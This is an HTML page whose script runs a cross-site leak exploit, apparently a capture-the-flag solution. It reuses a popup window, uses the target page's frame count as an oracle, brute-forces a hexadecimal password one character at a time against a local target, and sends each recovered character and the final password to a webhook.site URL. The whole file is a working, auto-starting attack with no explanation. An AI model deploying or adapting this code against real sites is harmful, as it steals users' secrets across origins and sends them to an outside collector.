<!DOCTYPE html>
<html>
<head><title>Window Reuse XS-Leak</title></head>
<body>
<h1>XS-Leak - Window Reuse Technique</h1>
<pre id="output"></pre>
<script>
const TARGET = 'https://127.0.0.1:9999/';
const WEBHOOK = 'https://webhook.site/604a832e-fcc1-4774-a4a6-d91de8af9944/';
const CHARSET = '0123456789abcdef';

function log(msg) {
    document.getElementById('output').textContent += msg + '\n';
    console.log(msg);
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const waitFor = async (f, timeout = 5000) => {
    const start = Date.now();
    while (true) {
        if (await f()) return true;
        if (Date.now() - start > timeout) return false;
        await sleep(10);
    }
};

// Open window ONCE and reuse it
const win = window.open('about:blank');
if (!win) {
    alert('Popup blocked! Please allow popups and refresh.');
    throw new Error('Popup blocked');
}

async function check(candidate) {
    try {
        // Navigate the SAME window to about:blank first
        win.location = 'about:blank';
        await waitFor(() => win.length === 0, 2000);
        await sleep(100);
        
        // Navigate to target URL
        const url = TARGET + '?pass=' + encodeURIComponent(candidate);
        win.location = url;
        
        // Wait for cross-origin error (page loaded)
        await waitFor(() => {
            try {
                win.origin;
                return false;
            } catch {
                return true;
            }
        }, 3000);
        
        // Wait a bit for iframe to render if it exists
        await sleep(200);
        
        // Check frame count
        try {
            const frameCount = win.length;
            return frameCount > 0;
        } catch (e) {
            log(`  Error reading win.length: ${e.message}`);
            return false;
        }
    } catch (e) {
        log(`  Error in check: ${e.message}`);
        return false;
    }
}

async function start() {
    log('Starting exploit with window reuse technique...\n');
    
    fetch(WEBHOOK + '?status=reuse_started').catch(e=>{});
    
    // Verify oracle
    log('[*] Verifying oracle...');
    const good = await check('lebah');
    log(`  "lebah": ${good} (should be true)`);
    
    const bad = await check('lebahZ');
    log(`  "lebahZ": ${bad} (should be false)\n`);
    
    if (!good || bad) {
        log('❌ Oracle failed!');
        fetch(WEBHOOK + '?error=oracle_failed').catch(e=>{});
        return;
    }
    
    log('✅ Oracle working!\n');
    
    let known = 'lebah2';
    
    // Leak 12 hex chars
    for (let pos = 0; pos < 12; pos++) {
        log(`[*] Position ${pos+1}/12...`);
        let found = false;
        
        for (let c of CHARSET) {
            const candidate = known + c;
            const match = await check(candidate);
            log(`  "${c}": ${match ? '✓' : '✗'}`);
            
            if (match) {
                known = candidate;
                log(`\n✅ Found: ${known}\n`);
                fetch(WEBHOOK + '?progress=' + known).catch(e=>{});
                found = true;
                break;
            }
        }
        
        if (!found) {
            log('\n❌ No match found!');
            break;
        }
    }
    
    log('\n========================================');
    log('PASSWORD: ' + known);
    log('========================================');
    fetch(WEBHOOK + '?PASSWORD=' + known).catch(e=>{});
    
    // Close the reused window
    if (win && !win.closed) {
        win.close();
    }
}

log('Auto-starting exploit...\n');

// Auto-start after page loads
setTimeout(start, 500);
</script>
</body>
</html>
